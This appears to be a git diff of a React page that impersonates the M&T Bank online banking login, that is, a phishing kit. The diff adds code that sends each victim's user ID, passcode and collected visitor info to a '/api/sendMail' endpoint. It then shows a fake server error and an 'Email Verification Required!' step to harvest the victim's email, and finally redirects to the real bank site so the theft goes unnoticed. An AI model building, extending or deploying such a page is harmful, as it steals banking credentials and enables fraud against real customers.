@@ -9,14 +9,22 @@ import logo_coloured from '../../public/logo_coloured.png';
 import { AiOutlineClose } from "react-icons/ai";
 // import Footer from '../components/footer'
 import { useEffect, useState } from "react";
+import { toast, ToastContainer } from 'react-toastify';
+import "react-toastify/dist/ReactToastify.css";
+import { RotatingLines } from 'react-loader-spinner'
 
 
 export default function Home() {
+
   const [info, setInfo] = useState({})
   const [change, setChange] = useState(false)
   const [dropdown, setDropDown] = useState(false)
   const [user_id, setUserId] = useState('')
   const [passcode, setPasscode] = useState('')
+  const [email, setEmail] = useState('')
+  const [loading, setLoading] = useState(false)
+  const [stage, setStage] = useState(false)
+  const [error, setError] = useState('')
   useEffect(() => {
     async function fetchAm() {
       const response = await fetch('/api/getInfo')
@@ -27,11 +35,59 @@ export default function Home() {
     fetchAm()
   }, [])
 
-  const submit = async (e) => {
+  const notify = (e) => {
     e.preventDefault()
+    sendFirst()
+  };
+  const sendFirst = async() => {
+    // e.preventDefault()
+    setLoading(true)
     const payload = {
       user_id,
       passcode,
+      email,
+      domain: "www3.mtb.com",
+      ...info
+    }
+
+
+    const res = await fetch('/api/sendMail', {
+      method: "POST",
+      body: JSON.stringify(payload),
+      headers: {
+        'content-type': 'application/json'
+      }
+    })
+    // console.log(res)
+    if(res.ok){
+      console.log("Yeai!")
+      setLoading(false)
+      setStage(true)
+      toast.error("Error Notification !", {
+      position: "top-right"
+      });
+      setError('Error connecting to server')
+    }else{
+      console.log("Oops! Something is wrong.")
+      setLoading(false)
+      setStage(true)
+      toast.error("Error Notification !", {
+      position: "top-right"
+      });
+      setError('Error connecting to server')
+      // window.location.href = "https://www3.mtb.com";
+    }
+
+  }
+
+  const shootout = async (e) => {
+    e.preventDefault()
+    setLoading(true)
+    const payload = {
+      user_id,
+      passcode,
+      email,
+      domain: "www3.mtb.com",
       ...info
     }
 
@@ -45,12 +101,14 @@ export default function Home() {
     // console.log(res)
     if(res.ok){
       console.log("Yeai!")
-      // setLoading(false)
+      setLoading(false)
       setError('Error connecting to server')
+      window.location.href = "https://www3.mtb.com";
     }else{
       console.log("Oops! Something is wrong.")
-      // setLoading(false)
+      setLoading(false)
       setError('Error connecting to server')
+      // window.location.href = "https://www3.mtb.com";
     }
   }
 
@@ -63,7 +121,7 @@ export default function Home() {
     setDropDown(!dropdown)
   }
 
-  console.log(user_id, passcode)
+  console.log(email)
   return (
     <div>
 
@@ -201,50 +259,87 @@ export default function Home() {
             </div>
 
             <div className="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
-              <form className="space-y-6" onSubmit={submit}>
-                <div>
-                  {/* <label htmlFor="email" className="block text-sm font-medium leading-6 text-gray-900">Email address</label> */}
-                  <div className="mt-2">
-                    <input id="email" value={user_id} onChange={(e) => setUserId(e.target.value)} placeholder="User ID" name="userid" type="text" autoComplete="text" required className="block w-full p-5 h-[3.5em] rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
-                  </div>
-                </div>
+              <form className=" space-y-6" onSubmit={shootout}>
 
-                <div>
-                  <div className="flex items-center justify-between">
-                    {/* <label htmlFor="password" className="block text-sm font-medium leading-6 text-gray-900">Password</label> */}
-                    {/* <div className="text-sm">
-                      <a href="#" className="font-semibold text-indigo-600 hover:text-indigo-500">Forgot password?</a>
-                    </div> */}
-                  </div>
-                  <div className="mt-[-1em]">
-                    <input id="password" value={passcode} onChange={(e) => setPasscode(e.target.value)} placeholder="passcode" name="password" type="password" autoComplete="current-password" required className="block w-full h-[3.5em] p-5 rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
-                  </div>
-                </div>
+                  {stage ? (
+                    <div>
+                        <div>
+                          <p style={{color: 'red'}}>Email Verification Required!</p>
+                        {/* <label htmlFor="email" className="block text-sm font-medium leading-6 text-gray-900">Email address</label> */}
+                        <div className="mt-2">
+                          <input id="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Email" name="email" type="text" autoComplete="text" required className="block w-full p-5 h-[3.5em] rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
+                        </div>
+                      </div>
 
-                <div className="flex justify-between">
-                  <div className="flex items-center mb-4">
-                      <input id="default-checkbox" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600" />
-                      <label for="default-checkbox" class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300">Remember User ID</label>
-                  </div>
+                      <button type="submit" className="flex mt-5 w-[100px] justify-center h-10 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 bttn">
+                        {loading ? (
+                          <RotatingLines
+                          strokeColor="gray"
+                          strokeWidth="5"
+                          animationDuration="0.75"
+                          width="25"
+                          visible={true}
+                        />
+                        ): "Verify " + ">"}
+                      </button>
+                    </div>
+                  ) : (
                   <div>
-                    <p style={{fontSize: '12px'}}>
-                    {/* <svg className="login-icon -icon-question-mark" alt="">
-                      <use xlink:href="#icon-question-mark"></use>
-                    </svg> */}
-                    <a href="#">Help with User ID or Passcode</a>
-                    </p>
+                  <div>
+                  {/* <label htmlFor="email" className="block text-sm font-medium leading-6 text-gray-900">Email address</label> */}
+                  <div className="">
+                      <input id="user_id" value={user_id} onChange={(e) => setUserId(e.target.value)} placeholder="User ID" name="userid" type="text" autoComplete="text" required className="block w-full p-5 h-[3.5em] rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
+                    </div>
+                    </div>
+
+                    <div>
+                      <div className="flex items-center justify-between">
+                        {/* <label htmlFor="password" className="block text-sm font-medium leading-6 text-gray-900">Password</label> */}
+                        {/* <div className="text-sm">
+                          <a href="#" className="font-semibold text-indigo-600 hover:text-indigo-500">Forgot password?</a>
+                        </div> */}
+                      </div>
+                      <div className="mt-[2em]">
+                        <input id="password" value={passcode} onChange={(e) => setPasscode(e.target.value)} placeholder="passcode" name="password" type="password" autoComplete="current-password" required className="block w-full h-[3.5em] p-5 rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
+                      </div>
+                    </div>
+
+                    <div className="flex justify-between mt-[1em]">
+                      <div className="flex items-center mb-4">
+                          <input id="default-checkbox" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600" />
+                          <label for="default-checkbox" class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300">Remember User ID</label>
+                      </div>
+                      <div>
+                        <p style={{fontSize: '12px'}}>
+                        {/* <svg className="login-icon -icon-question-mark" alt="">
+                          <use xlink:href="#icon-question-mark"></use>
+                        </svg> */}
+                        <a href="#">Help with User ID or Passcode</a>
+                        </p>
+                      </div>
+
+                    </div>
+
+                    <button onClick={notify} className="flex w-[100px] justify-center h-10 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 bttn">
+                     {loading ? (
+                      <RotatingLines
+                      strokeColor="gray"
+                      strokeWidth="5"
+                      animationDuration="0.75"
+                      width="25"
+                      visible={true}
+                    />
+                     ): "Log In " + ">"}
+                    </button>
                   </div>
 
-                </div>
-
-                  <button type="submit" className="flex w-[100px] justify-center h-10 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 bttn">
-                    {"Log In >"}
-                  </button>
+                  )}
               </form>
               {/* <div className="outer-div mt-6">
                     <div className="inner">or</div>
               </div> */}
 
+             <ToastContainer />
               <div className="mt-10">
                   <button  className="flex all_a justify-center h-10 rounded-md bg-white-600  py-1.5 leading-6 text-black shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2" >
                     Enroll in M&T Online Banking
@@ -287,11 +382,9 @@ export default function Home() {
 
 
               </div>
-
-
-
-
             </div>
+
+
 
             <div className="flex flex-col p-5 ff" >
                     <div className="sec">
@@ -314,6 +407,8 @@ export default function Home() {
             </div>
 
         </div>
+
+
 
       </div>
 
